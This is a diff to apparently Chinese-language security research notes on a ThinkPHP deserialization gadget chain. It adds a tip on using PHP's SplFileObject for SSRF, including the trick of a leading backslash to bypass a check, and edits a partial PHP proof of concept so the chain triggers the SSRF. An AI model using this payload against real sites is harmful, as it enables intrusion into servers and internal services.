@@ -55,12 +55,13 @@
 `class Template` new任意无参数类
 找`call_user_func_array(`?
 -->
+有个可造成SSRF的原生类:`new \SplFileObject("http://0:2333/");`(记得要在前面加`\`过if条件判断)
 
 
 
 
 ## POC
-### 实例化任意类测试
+### 实例化任意类测试(SSRF)
 ```php
 <?php
 namespace think\process\pipes{
@@ -74,8 +75,8 @@ namespace think\process\pipes{
 
 namespace think{
     class Model{
-        protected $data = ["c014"=>"123"];
-        protected $type = ["c014"=>"think\console\input\Definition"];
+        protected $data = ["c014"=>"http://0:2333"];
+        protected $type = ["c014"=>"\SplFileObject"];
     }
 }
 
